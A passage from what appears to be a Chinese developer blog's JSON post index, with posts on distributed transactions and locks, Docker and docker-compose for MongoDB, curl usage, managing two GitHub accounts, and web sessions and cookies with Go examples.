transaction)、Leader选举、序列号生成等都会遇到一致性问题。\n\n<!-- more -->\n\n一致性还具备两个属性\n\n+ 一个是强一致(safety)，它要求所有节点状态一致、共进退；\n\n+ 一个是可用(liveness)，它要求分布式系统24*7无间断对外服务。\n\nFLP定理(FLP impossibility) 否定了同时满足safety 和 liveness 的一致性协议的存在。工程实践上根据具体的业务场景，或保证强一致(safety)，或在节点宕机、网络分化的时候保证可用(liveness)。\n\n所以 CAP 模型, 要么是 CP, 或者AP, CA 不存在。\n\n\n\n# 1. 强一致性解决方案\n\n### 1.1 XA两阶段提交(2PC)\n\n2PC(tow phase commit)两阶段提交顾名思义它分成两个阶段，先由一方进行提议(propose)并收集其他节点的反馈(vote)，再根据反馈决定提交(commit)或中止(abort)事务。\n\n在异步环境(asynchronous)并且没有节点宕机(fail-stop)的模型下，2PC可以满足全认同、值合法、可结束，是解决一致性问题的一种协议。\n\n##### 1.1.1 角色\n\n+ 我们将提议的节点称为协调者(coordinator)\n+ 其他参与决议节点称为参与者(participants, 或cohorts)\n\n##### 1.1.2 执行过程\n\n+ 第一阶段\n\n  coordinator发起一个提议，分别问询各participant是否接受。participant执行本地事务, 结果给coordinator。\n\n+ 第二阶段\n\n  coordinator根据participant的反馈，下达提交或中止事务，如果participant全部同意则提交，只要有一个participant不同意就中止。\n\n##### 1.1.3 宕机处理\n\ncoordinator如果在发起提议后宕机，那么participant将进入阻塞(block)状态、一直等待coordinator回应以完成该次决议。这时需要另一角色把系统从不可结束的状态中带出来，我们把新增的这一角色叫协调者备份(coordinator watchdog)。\n\ncoordinator宕机一定时间后，coordinator watchdog接替原coordinator工作，通过问询(query) 各participant的状态，决定阶段2是提交还是中止。\n\n这也要求 coordinator/participant 记录(logging)历史状态，以备coordinator宕机后watchdog对participant查询、coordinator宕机恢复后重新找回状态。\n\n### 1.2 三阶段提交(3PC)\n\n相比2PC，3PC增加了一个准备提交(prepare to commit)阶段。\n\n在2PC中一个participant的状态只有它自己和coordinator知晓，假如coordinator提议后自身宕机，在watchdog启用前一个participant又宕机，其他participant就会进入既不能回滚、又不能强制commit的阻塞状态，直到participant宕机恢复。\n\n##### 1.2.1 执行过程\n\n+ 第一阶段\n\n  cancommit 是否可以执行事务\n\n+ 第二阶段\n\n  precommit 准备提交阶段  执行事务, 不提交, 返回给协调者\n\n+ 第三阶段\n\n  docommit \n\n##### 1.2.2 宕机处理\n\n+ 阶段1: \n\n  coordinator或watchdog未收到宕机participant的vote，直接中止事务；\n\n​\t宕机的participant恢复后，读取logging发现未发出赞成vote，自行中止该次事务\n\n+ 阶段2: \n\n  coordinator未收到宕机participant的precommit ACK，但因为之前已经收到了宕机participant的赞成反馈(不然也不会进入到阶段2)，coordinator进行commit；\n\n  宕机的participant恢复后发现收到precommit或已经发出赞成vote，则自行commit该次事务\n\n+ 阶段3: \n\n  即便coordinator或watchdog未收到宕机participant的commit ACK，也结束该次事务；\n\n  宕机的participant恢复后发现收到commit或者precommit，也将自行commit该次事务\n\n##### 1.2.3 总结\n\n因为有了准备提交(prepare to commit)阶段，3PC的事务处理延时也增加了1个RTT，变为3个RTT(propose+precommit+commit)，但是它防止participant宕机后整个系统进入阻塞态，增强了系统的可用性，对一些现实业务场景是非常值得的。\n\n### 1.3 TCC 补偿机制\n\n业务侵入, 业务的回滚, 有可能数据库不支持事务\n\n+ 第一阶段\n\n  Try, 试试是否可执行\n\n+ 第二阶段\n\n  Confirm, 执行业务, 直接提交, try 成功, confirm 也就成功\n\n+ 第三阶段\n\n  Cancel, 业务出错了, 在回滚, 单独一个方法\n\n  \n\n# 2. 最终一致性解决方案\n\n### 2.1 本地消息表\n\n+ A执行事务成功, 发送到消息队列\n+ B从消息队列取出数据, 执行事务\n+ B 执行成功或失败, 通知 A, 决定提交还是回滚\n\n### 2.2 MQ 消息队列\n\nRabbitMQ 和 Kafka 不支持事务消息,  RocketMQ 支持\n\n+ A先发送消息到事务队列, 状态为Prepare, 这个消息不会被消费\n+ A执行本地事务成功了, 发送Confirm, 把队列改成可消费状态\n+ B拿到消息后, 开始执行事务, 发送ACK, 修改队列的状态\n+ A看队列的状态决定提交还是回滚\n\n### 2.3 Seata\n\n\n+ XA 和 AT两阶段提交\nXA 事务是数据库的事务\nAT 的事务和数据库有了脱离\n\n\n\n# 3. 分布式锁\n\n### 3.1 数据库\n\n开销较大\n\n##### 3.1.2 表的主键来实现\n\n+ 同一个主键插入成功获得锁\n+ 其他插入主键冲突, 失败\n+ 执行成功删除主键, 释放锁\n\n##### 3.1.3 排它锁实现\n\n+ select for update,拿到锁\n+ 其他事务阻塞\n+ 拿到锁以后, commit 释放锁\n\n### 3.2 redis\n\n1. SETNX + expire 函数解决, 2个函数没有达到原子性\n\n2. SET() 里面有过期时间, 一个函数搞定, 但是其他过期了, 可以释放别人的锁\n\n3. 通过UUID 判断, 只能释放自己的锁\n\n### 3.3 redission\n\n类似上面的原理, 直接用\n\n### 3.4 zookeeper\n\n通过临时和序号的原理, 加上 watch 的原理\n\n+ 创建临时序号节点\n+ 获取最小的节点是否时读锁, 如果是读, 那么获得锁\n+ 如果不是, 阻塞等待,  每个节点只监听它的上一个节点, 获取通知\n\n### 3.5 consul\n\n类型 redis, 两个函数\n\n+ acquir(key, value) 成功返回 true, 失败返回 false\n+ release(key) 删除 key\n\n### 3.6 etcd\n\n续约功能, 防止无法释放\n\nRevision功能, 执行会加一, 用来判断\n\nWatch 功能, 监听 revision 比自己小的\n\nPrefix 功能：获取一个列表\n\n+ 步骤 1\n\n  客户端连接 Etcd，以 /lock/mylock 为前缀创建全局唯一的 key，\n  假设第一个客户端对应的 key=\"/lock/mylock/UUID1\"，第二个为 key=\"/lock/mylock/UUID2\"；\n\n  客户端分别为自己的 key 创建租约 - Lease，租约的长度根据业务耗时确定，假设为 15s；\n\n\n+ 步骤 2\n\n  创建定时任务作为租约的“心跳”\n  当一个客户端持有锁期间，其它客户端只能等待，为了避免等待期间租约失效，客户端需创建一个定时任务作为“心跳”进行续约。此外，如果持有锁期间客户端崩溃，心跳停止，key 将因租约到期而被删除，从而锁释放，避免死锁。\n\n+ 步骤 3\n\n  客户端将自己全局唯一的 key 写入 Etcd 进行 put 操作，将步骤 1 中创建的 key 绑定租约写入 Etcd，根据 Etcd 的 Revision 机制，假设两个客户端 put 操作返回的 Revision 分别为 1、2，客户端需记录 Revision 用以接下来判断自己是否获得锁。\n\n+ 步骤 4\n\n  客户端以前缀 /lock/mylock 读取 keyValue 列表（keyValue 中带有 key 对应的 Revision），判断自己 key 的 Revision 是否为当前列表中最小的，如果是则认为获得锁；\n\n  否则监听列表中前一个 Revision 比自己小的 key 的删除事件，一旦监听到删除事件或者因租约失效而删除的事件，则自己获得锁。\n\n+ 步骤 5\n  获得锁后，操作共享资源，执行业务代码。\n+ 步骤 6 \n  完成业务流程后，删除对应的key释放锁。\n\n\n\n# 4. 其他补充\n\n### 4.1 zab 和 raft 什么区别\n\n//TODO:\n\n# 5. 参考资料\n\n+ https://www.cnblogs.com/bangerlee/p/6216997.html","tags":["分布式"],"categories":["分布式"]},{"title":"docker中使用mongodb","url":"%2Fp%2F6fa8633a.html","content":"\n### 1. 安装\n\n##### 1.1 安装 mongodb\n\n```bash\nmkdir ~/data\n\nsudo docker pull mongo:latest \n\n# 一定要把数据卷暴露出去, 这样方便数据迁移\nsudo docker run -d -p 27017:27017 --name mongo -v /home/liuwei/data:/data/db mongo:latest\n\nsudo docker exec -it mongo mongo\n```\n\n<!-- more -->\n\n\n\n##### 1.2 将数据迁移到新容器\n\nLet's start a new MongoDB container, this time running on port 37017 instead of the default 27017:\n\n```bash\n# Copy the data from the previous container \nsudo cp -r ~/data ~/data_clone  \n\n# Start another MongoDB container \nsudo docker run -d -p 37017:27017 -v ~/data_clone:/data/db mongo\n```\n\n\n\n### 2. 使用\n\n```sql\ndb.createCollection('cities') \ndb.cities.insert({ name: 'New York', country: 'USA' }) \ndb.cities.insert({ name: 'Paris', country: 'France' }) \ndb.cities.find()\n```\n\n\n\n### 3. 参考资料\n\n+ https://www.thachmai.info/2015/04/30/running-mongodb-container/\n\n+ docker-compose 使用mongodb 参考 {% post_link 2-linux系统/docker/docker-compose的一次实践 %}\n\n","tags":["docker"],"categories":["docker"]},{"title":"docker-compose的一次实践","url":"%2Fp%2F331c471e.html","content":"\n\n\n### 0. 前言\n\nDocker Compose 是 Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用，它是由 `python` 编写。\n\n`Compose` 定位是定义和运行多个 Docker 容器的应用。`Compose` 有两个重点\n\n- `docker-compose.yml` `compose` 配置文件\n- `docker-compose` 命令行工具\n\n<!-- more -->\n\n### 1. 安装\n\nwindows 和 mac 中 `docker-compose` 在安装 `docker` 的时候就已经捆绑安装了。linux 中需要自己安装\n\n\n```bash\n# 版本可以去 github 查看最新的版本\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-(uname -s)-(uname -m)\" -o /usr/local/bin/docker-compose \n\n\nsudo chmod +x /usr/local/bin/docker-compose \n\ndocker-compose --version\n```\n\n\n\n### 2. 使用\n\n```bash\ndocker-compose up # 启动\ndocker-compose down # 关闭\n```\n\n> docker-compose.yml\n\n```yml\nversion: '3' # 定义版本，不指定默认为版本 1，新版本功能更多\n\n\nservices:\n\n  mongo4:\n    image: mongo:4\n    privileged: true\n    restart: unless-stopped\n    volumes:  \n      - $HOME/transcode/data/db/:/data/db/\n      - ./mongo/mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro\n    container_name: mongo4\n    environment:\n      MONGO_INITDB_ROOT_USERNAME: yx1\n      MONGO_INITDB_ROOT_PASSWORD: test\n      MONGO_INITDB_DATABASE: transcode_v1\n    network_mode: bridge # 加上不会创建默认的桥, 即有一个为空, 就会创建一个默认 network\n    ports: # 暴露端口信息\n      - \"47047:27017\"\n\n\n\n  transcode-service:\n    build: service # 指定 Dockerfile 所在文件夹的路径\n    privileged: true # 允许容器中运行一些特权命令\n    restart: unless-stopped\n    volumes:\n     - /var/lib/oceans/:/var/lib/oceans/\n    container_name: transcode-service\n    network_mode: host\n\n\n  transcode-webapi:\n    build: webapi\n    privileged: true\n    restart: unless-stopped\n    container_name: transcode-webapi\n    network_mode: host\n```\n\n\n\n然后在 webapi, service 文件夹内创建各自的 dockerfile 文件\n\n\n\n\n> ./mongo/mongo-init.js\n\n```javascript\ndb.createUser(\n    {\n        user: \"yx1\",\n        pwd: \"test\",\n        roles:[\n            {\n                role: \"readWrite\",\n                db:   \"transcode_v1\"\n            }\n        ]\n    }\n);\n```\n\n\n\n##### 2.1 默认网桥问题\n\ndocker-compose 启动后会自动创建一个网桥, 如果不想创建, 即每个容器都写上值, 不能为空\n\n```yaml\nnetwork_mode: bridge\n```\n\n参考: https://stackoverflow.com/a/43755216\n\n\n\n##### 2.2 mongo 启动后自动创建用户\n\n参考: https://stackoverflow.com/a/54064268\n\n\n\n### 3. 参考资料\n\n+ https://yeasy.gitbooks.io/docker_practice/compose/\n+ https://juejin.im/post/5d17442e518825559f46ed92","tags":["docker-compose"],"categories":["docker"]},{"title":"curl命令的使用总结","url":"%2Fp%2Fda64728.html","content":"\n[curl](http://curl.haxx.se/)是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在\"标准输出\"（stdout）上面。\n\n### 1. 使用教程\n\n##### 1.1 查看网页源码和保存\n\n```bash\ncurl www.sina.com\n```\n\n如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用wget命令了。\n\n```bash\ncurl -o [文件名] www.sina.com\n```\n\n<!-- more -->\n\n##### 1.2 显示响应头信息\n\n`-i`参数可以显示http response的头信息，连同网页代码一起。`-I`参数则是只显示http response的头信息。\n\n```bash\ncurl -i www.sina.com\n```\n\n\n\n##### 1.3 显示通信过程\n\n`-v`参数可以显示一次http通信的整个过程，包括端口连接和http request头信息。\n\n```bash\ncurl -v www.sina.com\n```\n\n如果你觉得上面的信息还不够，那么下面的命令可以查看更详细的通信过程。\n\n```bash\ncurl --trace output.txt www.sina.com\ncurl --trace-ascii output.txt www.sina.com\n```\n\n运行后，请打开output.txt文件查看。\n\n\n\n### 2. 发送数据\n\n##### 2.1 发送GET\n\nGET方法相对简单，只要把数据附在网址后面就行。\n\n```bash\ncurl example.com/form.cgi?data=xxx\n```\n\n\n\n##### 2.2 发送POST\n\nPOST方法必须把数据和网址分开，curl就要用到--data参数。\n\n```bash\ncurl -X POST --data \"data=xxx\" example.com/form.cgi\n```\n\n如果你的数据没有经过表单编码，还可以让curl为你编码，参数是`--data-urlencode`。\n\n```bash\ncurl -X POST --data-urlencode \"date=April 1\" example.com/form.cgi\n\n# 如果编码前有=号, 需要提前编码\n--data-urlencode  'value=-vf scale=-2:360'   # 错误\n--data-urlencode  'value=-vf scale%3d-2:360' # 正确\n```\n\n\n\n##### 2.3 HTTP动词\n\ncurl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。\n\n```bash\ncurl -X DELETE www.example.com\n```\n\n\n\n##### 2.4 增加头信息\n\n有时需要在http request之中，自行增加一个头信息。`--header` 或 `-H `参数就可以起到这个作用。\n\n```bash\ncurl --header \"Content-Type:application/json\" http://example.com\n```\n\n\n\n##### 2.5 HTTP认证\n\n有些网域需要HTTP认证，这时curl需要用到`--user`参数。\n\n```bash\ncurl --user name:password example.com\n```\n\n\n\n##### 2.6 cookie\n\n使用`--cookie`参数，可以让curl发送cookie。\n\n```bash\ncurl --cookie \"name=xxx\" www.example.com\n```\n\n至于具体的cookie的值，可以从http response头信息的`Set-Cookie`字段中得到。\n\n\n\n`-c cookie-file`可以保存服务器返回的cookie到文件，`-b cookie-file`可以使用这个文件作为cookie信息，进行后续的请求。\n\n```bash\ncurl -c cookies http://example.com\ncurl -b cookies http://example.com\n```\n\n\n\n##### 2.7 User Agent字段\n\n这个字段是用来表示客户端的设备信息。服务器有时会根据这个字段，针对不同设备，返回不同格式的网页，比如手机版和桌面版。\n\n```bash\ncurl --user-agent \"[User Agent]\" [URL]\n```\n\n\n\n##### 2.8 Referer字段\n\n有时你需要在http request头信息中，提供一个referer字段，表示你是从哪里跳转过来的。\n\n```bash\ncurl --referer http://www.example.com http://www.example.com\n```\n\n\n\n##### 2.9 文件上传\n\n假定文件上传的表单是下面这样：\n\n```html\n<form method=\"POST\" enctype='multipart/form-data' action=\"upload.cgi\">\n　　　　<input type=file name=upload>\n　　　　<input type=submit name=press value=\"OK\">\n　　</form>\n```\n\n你可以用curl这样上传文件：\n\n```bash\ncurl --form upload=@localfilename --form press=OK [URL]\n```\n\n\n\n##### 2.10 终极命令\n\n```bash\ncurl --help\n```\n\n","tags":["curl"],"categories":["命令"]},{"title":"近期博客的折腾命运","url":"%2Fp%2F1dd7dc05.html","content":"\n\n\n### 1. github DMCA takedown\n\n前两天, 发现blog突然无法提交了. 去邮箱里看github发的邮件才知道有一篇博文涉及到jetbrains版权问题, 让24小时内处理, 后来完美错过了时间. 就直接被takedown了.\n\n\n\n### 2. 折腾过程\n\ntakedown后一脸懵逼, 在网上查询的解决方案基本都是给github发邮件, 请求删除仓库或者再给一次宽限24小时的处理时间. \n\n于是我试着发了一封邮件, 没想到10天后才得到回复 (这效率~~~). 回复的时间还在十一假期内, 虽然又给我了24小时处理, 又被我完美错过了.(!!!!!一定要定期查看邮件)\n\n<!-- more -->\n\n于是又想到了以下三个解决方案:\n\n+ 发邮件让 github 直接删除仓库(因为是blog, 本地有备份), 然后再重新建库.\n+ 部署到其他平台 (如 coding 或 自己的服务器上)\n+ 部署到小号的 github 上\n\n\n\n为了省事, 我最后的解决方案是:\n\n1. 先发送github给予删除仓库的邮件(截至到写blog的时间, 还没有得到回复) \n\n2. 然后在小号的github上创建了仓库. 然后把本地blog提交上去. 重新把域名绑定github page即可.\n\n   \n\n   \n\n> 为什么说折腾呢!!!!!!  \n\n\n\n在小号绑定CNAME时, 提示域名CNAME被占用, 要先删除之前的域名绑定, 因为之前的仓库被takedown了无法编辑删除, 小号仓库就无法添加.  真的是无fuck说\n\n\n\n后来小号又发了一封邮件说CNAME被占用, 回复让我在域名解析里加一条TXT记录, 照做后, 几天后就可以了.\n\n\n\n### 3. 事件教训\n\n+ 一样要提高版权意识.\n\n+ 定期查看邮件, 定期查看邮件, 定期查看邮件","categories":["个人记录"]},{"title":"github多帐号登录的问题","url":"%2Fp%2F899d7696.html","content":"\n\n\n### 1. 同一台电脑有2个github账号？\n\n+ 首先要为每个帐号生成公钥私钥对, 并且设置到 github 里, 参考 {% post_link 2-linux系统/git/github和gitee通过密钥来进行ssh连接 %}\n\n+ 修改 `~/.ssh/config`, 设置如下\n\n```bash\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\n测试:\n```bash\nssh -T git@unix2dos\nssh -T git@levonfly\n```\n<!-- more -->\n\n+ 要修改仓库的 remote url, 对应 `~/.ssh/config` 所填写的值.  注意, 要修改 git@后面的这个值\n\n```bash\ngit remote set-url origin git@unix2dos:unix2dos/LevonRecord.git\n```\n\n\n\n- 一定要设置用户名和邮箱.否则虽然可以提交 commit, 但是不认识你是谁\n\n  \n\n- 建议 global 用一个,  其他项目用另外的用户名\n\n```bash\ngit config -l\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email \"levonfly@gmail.com\" \n\n\ngit config user.name \"levonfly\"\ngit config user.email \"6241425@qq.com\" \n```\n\n\n\n### 2. mac切换用户提交失败的问题\n\n提交总是出现permission denied的问题，用git config --global更新了username和email也不行。\n\nmac os原因是即便更新了username和email，mac在git push时还是会使用历史账号的密码。\n\n> 解决方法如下：\n\n1. 进入Keychain Access (不知道在哪儿的可以command+space查找)\n2. 在搜索框输入'git'进行查找，将找到的文件删掉，这里保存了历史账号的信息\n3. 删除之后重新用git config --global更新username和email即可，之后git push会要求你输入username和password\n4. done!\n\n\n参考: https://www.zhihu.com/question/23028445/answer/399033488\n\n\n\n\n### 3. 参考资料\n\n+ https://gist.github.com/jexchan/2351996\n+ https://www.zhihu.com/question/23028445/answer/399033488","tags":["github"],"categories":["git"]},{"title":"session的介绍和使用","url":"%2Fp%2F312a7a36.html","content":"\n\n\n### 0. 前言\n\n除了使用Cookie，Web应用程序中还经常使用Session来记录客户端状态。Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。\n\n\n\nSession在用户第一次访问服务器的时候自动创建。客户端只保存sessionid到cookie中，而不会保存session，session销毁只能通过invalidate或超时(默认30分钟)，关掉浏览器并不会关闭session。\n\n<!-- more -->\n\n### 1. session 介绍\n\n##### 1.1 Session与Cookie的区别\n\ncookie与session最大的区别就是一个是将数据存放在客户端，一个是将数据存放在服务端。cookie是将信息都存放在客户端的浏览器内存或磁盘中，所以不是很安全，别人可以分析存放在本地的cookie数据来进行用户信息的盗窃或进行cookie欺骗。\n\n所以在安全性上session要好一些，session通信的一般实现形式是通过cookie来实现，与cookie不同的是，session只会保存一个sessionID在客户端，不会像cookie那样将具体的数据保存在客户端，session具体的数据只会保存在服务端上\n\n在Servlet中session数据是被封装在一个对象里，而这个对象会被保存在对象池中，客户端发生请求时会带上它的sessionID，服务端就会根据这个sessionID，来从对象池中获得相应的session对象，从对象中获得session的具体数据，服务端通过这个session数据来保持或改变与客户端会话的状态。\n\n\n\n##### 1.2 Session机制\n\n以上也介绍了Session有两个主要的东西，一个是SessionID，一个是存放在服务端对象池中的Session对象。\n\n客户端访问服务端的时候，会先判断这个客户端的请求数据中是否包含有SessionID，如果没有的话，就会认为这个客户端是第一次进行访问。因为是第一次访问，所以服务端会给客户端在对象池中创建一个Session对象（假设这个会话是需要维持的），并生成出这个对象的SessionID，接着会通过cookie将SessionID响应给客户端，同时会把Session对象放回对象池里。客户端接收响应数据后会将SessionID存放在本地，下一次再访问服务端的时候就会把SessionID给带上，服务端就能够通过SessionID获得相应的Session对象，Session就是以这样的一个机制维持会话状态的。\n\n\n\n##### 1.3 session 存储问题\n\nsession如何存储才是高效，是存在内存、文件还是数据库了？文件和数据库的存储方式都是将session的数据固化到硬盘上，操作硬盘的方式就是IO，IO操作的效率是远远低于操作内存的数据，因此文件和数据库存储方式是不可取的，所以将session数据存储到内存是最佳的选择。\n\n因此最好的解决方案就是使用分布式缓存技术，例如：memcached和redis，将session信息的存储独立出来也是解决session同步问题的方法。\n\n\n\n##### 1.4 session劫持防范\n\n其中一个解决方案就是sessionID的值只允许cookie设置，而不是通过URL重置方式设置，同时设置cookie的httponly为true,这个属性是设置是否可通过客户端脚本访问这个设置的cookie，第一这个可以防止这个cookie被XSS读取从而引起session劫持，第二cookie设置不会像URL重置方式那么容易获取sessionID。\n\n第二步就是在每个请求里面加上token，实现类似前面章节里面讲的防止form重复递交类似的功能，我们在每个请求里面加上一个隐藏的token，然后每次验证这个token，从而保证用户的请求都是唯一性。\n\n还有一个解决方案就是，我们给session额外设置一个创建时间的值，一旦过了一定的时间，我们销毁这个sessionID，重新生成新的session，这样可以一定程度上防止session劫持的问题。\n\n\n\n### 2. golang 使用 session\n\n+ github.com/gorilla/sessions\n\n```go\n// sessions.go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/sessions\"\n)\n\nvar (\n    // key must be 16, 24 or 32 bytes long (AES-128, AES-192 or AES-256)\n    key = []byte(\"super-secret-key\")\n    store = sessions.NewCookieStore(key)\n)\n\nfunc secret(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Check if user is authenticated\n    if auth, ok := session.Values[\"authenticated\"].(bool); !ok || !auth {\n        http.Error(w, \"Forbidden\", http.StatusForbidden)\n        return\n    }\n\n    // Print secret message\n    fmt.Fprintln(w, \"The cake is a lie!\")\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Authentication goes here\n    // ...\n\n    // Set user as authenticated\n    session.Values[\"authenticated\"] = true\n    session.Save(r, w)\n}\n\nfunc logout(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Revoke users authentication\n    session.Values[\"authenticated\"] = false\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/secret\", secret)\n    http.HandleFunc(\"/login\", login)\n    http.HandleFunc(\"/logout\", logout)\n\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n\n\n```bash\n$ go run sessions.go\n\n$ curl -s http://localhost:8080/secret\nForbidden\n\n$ curl -s -I http://localhost:8080/login\nSet-Cookie: cookie-name=MTQ4NzE5Mz...\n\n$ curl -s --cookie \"cookie-name=MTQ4NzE5Mz...\" http://localhost:8080/secret\nThe cake is a lie!\n```\n\n\n\n+ https://github.com/gin-contrib/sessions\n\n```go\npackage main\n\nimport (\n\t\"github.com/gin-contrib/sessions\"\n\t\"github.com/gin-contrib/sessions/cookie\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tstore := cookie.NewStore([]byte(\"secret\"))\n\tr.Use(sessions.Sessions(\"mysession\", store))\n\n\tr.GET(\"/incr\", func(c *gin.Context) {\n\t\tsession := sessions.Default(c)\n\t\tvar count int\n\t\tv := session.Get(\"count\")\n\t\tif v == nil {\n\t\t\tcount = 0\n\t\t} else {\n\t\t\tcount = v.(int)\n\t\t\tcount++\n\t\t}\n\t\tsession.Set(\"count\", count)\n\t\tsession.Save()\n\t\tc.JSON(200, gin.H{\"count\": count})\n\t})\n\tr.Run(\":8000\")\n}\n```\n\n\n\n### 3. 参考资料\n\n+ https://www.iteye.com/blog/justsee-1570652\n+ https://gowebexamples.com/sessions/\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/06.0.md\n\n\n\n","tags":["session"],"categories":["Web"]},{"title":"cookie的介绍和使用","url":"%2Fp%2F2a7234ed.html","content":"\n\n\n### 0. 前言\n\nCookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 `Web 服务器`保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。\n\nCookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。\n\n<!-- more -->\n\n### 1. Cookie 介绍\n\nCookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。\n\nCookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。\n\n- 对话（session）管理：保存登录、购物车等需要记录的信息。\n- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。\n- 追踪：记录和分析用户行为。\n\n有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。\n\n\n\n> Cookie 包含以下几方面的信息:\n\n- Cookie 的名字\n- Cookie 的值（真正的数据写在这里面）\n- 到期时间\n- 所属域名（默认是当前域名）\n- 生效的路径（默认是当前网址）\n\n举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含`www.example.com`这个域名，以及根路径`/`。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。 \n\n\n\n##### 1.1 判断cookie\n\n浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。\n\n```bash\n// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true\n```\n\n`document.cookie`属性返回当前网页的 Cookie。\n\n```\n// 当前网页的 Cookie\ndocument.cookie\n```\n\n同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。\n\n浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`读取。\n\n\n\n##### 1.2 Cookie 与 HTTP 协议\n\nCookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。\n\n> 1.2.1 HTTP 回应：Cookie 的生成\n\n服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。\n\n```\nSet-Cookie:foo=bar\n```\n\n上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。\n\nHTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。\n\n```\nSet-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n```\n\n一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。\n\n\n\n如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。\n\n```\nSet-Cookie: key1=value1; domain=example.com; path=/blog\n```\n\n改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n```\n\n只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。\n\n```\nSet-Cookie: key1=value2; domain=example.com; path=/\n```\n\n上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。\n\n```\nCookie: key1=value1; key1=value2\n```\n\n上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。\n\n\n\n> 1.2.2 HTTP 请求：Cookie 的发送\n\n浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。\n\n```\nCookie: foo=bar\n```\n\n上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。\n\n`Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。\n\n```\nCookie: name=value; name2=value2; name3=value3\n```\n\n下面是一个例子。\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。\n\n- Cookie 的各种属性，比如何时过期。\n- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。\n\n\n\n##### 1.3 Cookie 的属性\n\n> 1.3.1 